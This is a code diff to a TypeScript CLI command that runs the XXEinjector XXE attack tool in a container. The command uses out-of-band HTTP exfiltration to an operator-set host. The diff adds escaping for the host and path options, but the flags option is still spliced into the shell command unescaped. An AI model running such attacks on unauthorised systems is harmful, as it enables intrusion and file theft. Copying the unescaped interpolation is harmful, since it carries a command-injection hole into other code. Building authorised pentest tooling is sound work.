@@ -1,6 +1,7 @@
 import { Command, Option } from "commander";
 import { existsSync } from "fs";
 import { writeAIReport } from "../../lib/ai";
+import { safe } from "../../lib/args";
 import { runInContainer } from "../../lib/container";
 import { createFileStream } from "../../lib/files";
 import { throwError } from "../../lib/utils";
@@ -9,29 +10,25 @@ export function register(cli: Command) {
   cli
     .description("run xxe attack (XXEinjector)")
     .version("1.0.0", "-V")
-    .addOption(new Option("--id <id>", "output identifier").default(""))
-    .addOption(new Option("--ai", "generate AI report").default(false))
+    .addOption(new Option("--id <id>", "output file identifier"))
+    .addOption(new Option("--ai", "generate AI report"))
     .addOption(
       new Option(
         "-t, --target <target>",
-        "target request",
+        "* target request",
       ).makeOptionMandatory(),
     )
-    .addOption(new Option("-H, --host <host>", "host").makeOptionMandatory())
-    .addOption(new Option("-p, --path <path>", "path").default(""))
-    .addOption(
-      new Option("--flags-xeeinjector <flags>", "XXEinjector flags").default(
-        "",
-      ),
-    )
+    .addOption(new Option("-H, --host <host>", "* host").makeOptionMandatory())
+    .addOption(new Option("-p, --path <path>", "path"))
+    .addOption(new Option("--flags-xeeinjector <flags>", "XXEinjector flags"))
     .action(
       async (opts: {
-        id: string;
-        ai: boolean;
+        id?: string;
+        ai?: boolean;
         target: string;
         host: string;
-        path: string;
-        flagsXeeinjector: string;
+        path?: string;
+        flagsXeeinjector?: string;
       }) => {
         // Exist
         if (!existsSync(opts.target))
@@ -39,13 +36,13 @@ export function register(cli: Command) {
         // Setup
         const [, file] = createFileStream("web", "xxe", opts.id || opts.target);
         // Command
-        let cmd = `figlet "ni" && `;
+        let cmd = `figlet "ni" \n`;
         // XXEinjector
-        cmd += `figlet "xxeinjector" && `;
-        cmd += `cd /opt/apps/XXEinjector/ && `;
-        cmd += `ruby XXEinjector.rb --host=${opts.host} --file=/data/target.txt`;
-        if (opts.path) cmd += ` --path=${opts.path}`;
-        cmd += ` --oob=http --phpfilter --xslt ${opts.flagsXeeinjector}`;
+        cmd += `figlet "xxeinjector" \n`;
+        cmd += `cd /opt/apps/XXEinjector/ \n`;
+        cmd += `ruby XXEinjector.rb --host="${safe(opts.host)}" --file=/data/target.txt`;
+        if (opts.path) cmd += ` --path="${safe(opts.path)}"`;
+        cmd += ` --oob=http --phpfilter --xslt ${opts.flagsXeeinjector || ""}`;
         // Run
         const data = await runInContainer({
           cmd: cmd,
